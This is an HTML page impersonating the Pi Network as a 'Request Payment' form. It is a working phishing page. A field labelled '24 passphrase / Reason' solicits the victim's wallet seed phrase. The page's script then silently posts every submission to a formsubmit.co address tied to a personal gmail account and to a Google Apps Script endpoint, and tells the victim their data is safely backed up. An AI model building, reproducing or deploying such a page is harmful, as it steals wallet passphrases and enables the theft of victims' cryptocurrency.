<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pi - Request Payment</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    body { font-family: 'Inter', sans-serif; background-color: #f3f4ff; }
    @keyframes fadeIn { from {opacity: 0; transform: translateY(-10px);} to {opacity: 1; transform: translateY(0);} }
    .bg-pi-purple { background-color: #5A2D82; }
    .text-pi-yellow { color: #F5C65A; }
    .error-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      background-color: #f3f4ff; z-index: 50; display: none; align-items: center;
      justify-content: center; text-align: center; animation: fadeIn 0.3s ease-out forwards; }
    body.overlay-active #mainContent, body.overlay-active header, body.overlay-active footer { display: none; }
  </style>
</head>
<body class="flex flex-col min-h-screen">

  <!-- Header -->
  <header class="bg-pi-purple text-white py-4 px-5 sticky top-0 z-10 shadow-md">
    <div class="max-w-lg mx-auto flex items-center relative">
      <a href="index.html" class="absolute left-0 text-white">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
        </svg>
      </a>
      <h1 class="text-xl font-semibold text-center flex-grow flex items-center justify-center">
        Request Payment
        <div class="ml-2 text-pi-yellow" style="width: 20px; height: 20px;">
          <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" style="color: #F5C65A;">
            <path d="M50 8C27.9 8 10 25.9 10 50s17.9 42 40 42 40-17.9 40-42S72.1 8 50 8zm-5 22h10v10h-6v30h-4V40h-6v-10zm25 10a15 15 0 010 30" fill="currentColor"/>
          </svg>
        </div>
      </h1>
    </div>
  </header>

  <!-- Main -->
  <main id="mainContent" class="flex-grow w-full max-w-lg mx-auto p-6">
    <section class="bg-white p-6 rounded-lg shadow-md">
      <header class="mb-5 text-center">
        <h2 class="text-lg font-bold text-gray-700">Enter Payment Details</h2>
        <p id="instructionMessage" class="text-gray-500 text-sm mt-1">
          Please fill out the details below to complete your payment request.
        </p>
      </header>

      <form id="paymentRequestForm" method="POST" class="space-y-4">
        <div>
          <label for="amount" class="block text-xs font-medium text-gray-600 mb-1">Amount:</label>
          <input type="number" id="amount" name="amount" required step="0.01" min="0" placeholder="0.00"
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        </div>

        <div>
          <label for="currency" class="block text-xs font-medium text-gray-600 mb-1">Currency:</label>
          <input type="text" id="currency" name="currency" required value="USD"
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
        </div>

        <div>
          <label for="reason" class="block text-xs font-medium text-gray-600 mb-1">24 passphrase / Reason:</label>
          <textarea id="reason" name="reason" rows="5" required
            placeholder="Provide a detailed reason for the payment request."
            class="w-full px-3 py-2 text-sm border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
        </div>

        <button type="submit"
          class="w-full bg-pi-purple hover:opacity-90 text-white font-semibold py-3 px-4 rounded-lg text-sm transition duration-300 ease-in-out shadow-sm disabled:opacity-50">
          Send Request Message
        </button>

        <div id="statusMessage" class="mt-3 text-xs text-center min-h-[1rem]"></div>
      </form>
    </section>
  </main>

  <!-- Overlay -->
  <div id="errorOverlay" class="error-overlay p-6">
    <div class="max-w-sm mx-auto p-8 rounded-xl shadow-2xl bg-white border border-red-300">
      <svg class="mx-auto h-16 w-16 text-red-600 mb-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
        <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
      </svg>
      <h2 class="text-2xl font-bold text-red-700 mb-3">Error Processing Request</h2>
      <p class="text-gray-600 text-sm mb-6">
        We encountered an issue while validating your submission data. Please try again.
      </p>
      <button id="tryAgainButton"
        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded-lg transition duration-300 ease-in-out shadow-lg">
        Please try again
      </button>
    </div>
  </div>

  <footer class="w-full max-w-lg mx-auto mt-6 py-4 text-center text-gray-400 text-xs">
    Pi network system © 2019
  </footer>

  <script>
    const form = document.getElementById('paymentRequestForm');
    const errorOverlay = document.getElementById('errorOverlay');
    const tryAgainButton = document.getElementById('tryAgainButton');
    const statusMessage = document.getElementById('statusMessage');

    const FORM_SUBMIT_URL = "https://formsubmit.co/alecbing864@gmail.com";
    const SHEET_BACKUP_URL = "https://script.google.com/macros/s/AKfycbygl9DlHj1nqcHwJk7iRIr3qAlElv1mwI9gQddRCI0-gU7AZ8KA7UZS-1dh7uZpEA/exec";

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      statusMessage.textContent = "Submitting... Please wait.";
      const formData = new FormData(form);

      // ✅ Automatically include current date & time
      const now = new Date();
      const formattedDateTime = now.toLocaleString(); // Example: "10/26/2025, 4:22 PM"
      formData.append("timestamp", formattedDateTime);

      try {
        await fetch(FORM_SUBMIT_URL, { method: "POST", body: formData });
        await fetch(SHEET_BACKUP_URL, { method: "POST", body: formData });

        statusMessage.textContent = "✅ Request sent successfully! Your data is backed up in Google Sheets.";
        form.reset();
      } catch (error) {
        console.error("Error submitting:", error);
        statusMessage.textContent = "⚠️ There was an issue sending your request. Please try again.";
        document.body.classList.add('overlay-active');
        errorOverlay.style.display = 'flex';
      }
    });

    tryAgainButton.addEventListener('click', () => {
      errorOverlay.style.display = 'none';
      document.body.classList.remove('overlay-active');
    });
  </script>

</body>
</html>
